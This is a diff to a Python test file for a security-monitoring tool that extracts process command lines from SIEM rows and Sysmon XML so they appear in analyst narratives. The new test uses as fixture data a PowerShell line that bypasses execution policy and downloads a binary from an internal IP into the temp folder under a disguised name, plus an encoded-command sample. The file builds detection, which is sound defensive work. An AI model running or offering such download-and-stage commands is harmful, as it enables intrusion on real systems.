@@ -4,9 +4,9 @@ import base64
 
 from contracts import DomainFinding, ResultSet
 
-from smartops.subagent_analysts.analyze import ENCODED_FOOTER, ENCODED_LINE_CAP, _as_judgement
+from smartops.subagent_analysts.analyze import COMMANDS_FOOTER, ENCODED_FOOTER, ENCODED_LINE_CAP, _as_judgement
 from smartops.subagent_analysts.routing import DomainSlice
-from smartops.tools.native.decoder import encoded, signature
+from smartops.tools.native.decoder import commands_in, encoded, signature
 
 BLOB = "JABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQA="  # $env:username, from run e1461da6
 DESKTOP = r"C:\Users\Administrator\Desktop\splunkd.exe"
@@ -62,3 +62,27 @@ def test_nested_encoded_command_cut_by_splunk_still_decodes():
     rows = [{"CommandLine": f"powershell -e {_enc(f'powershell -EncodedCommand {inner}')}", "count": "1"}]
 
     assert "Get-Proces" in _lines(rows)[0]
+
+
+def test_plain_interpreter_command_lines_reach_the_narrative():
+    # 148b0e69: the download sat in four tasks' rows and no narrative named it.
+    download = ("powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest -Uri "
+                "http://192.168.40.211/update/win-agent-2.4.1.bin -OutFile $env:TEMP\\svcupdate.dat\"")
+    rows = [
+        {"Processes.process": download, "count": "1"},
+        {"Processes.process": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "count": "5"},
+        {"Processes.process": r"C:\Windows\explorer.exe /factory", "count": "2"},
+        {"Processes.process": f"powershell.exe -EncodedCommand {BLOB}", "count": "3"},
+    ]
+    slice_ = DomainSlice(domain="endpoint", siem_sets=[("processes", ResultSet(query="q", row_count=4, rows=rows))])
+
+    first = _as_judgement(DomainFinding(domain="endpoint", narrative="n"), slice_).narrative
+    block = first.split(COMMANDS_FOOTER + "\n")[1].splitlines()
+
+    assert block == [f"~ 1 events: {download}"]
+
+
+def test_a_raw_sysmon_row_gives_its_command_line_from_the_xml():
+    # 148b0e69's T4 searched by hash and tabled `_raw`: the download sat in the XML.
+    raw = "<Data Name='CommandLine'>powershell.exe -C Test-Connection 10.0.10.1</Data>"
+    assert commands_in([{"_raw": raw}]) == {"powershell.exe -C Test-Connection 10.0.10.1": 1}
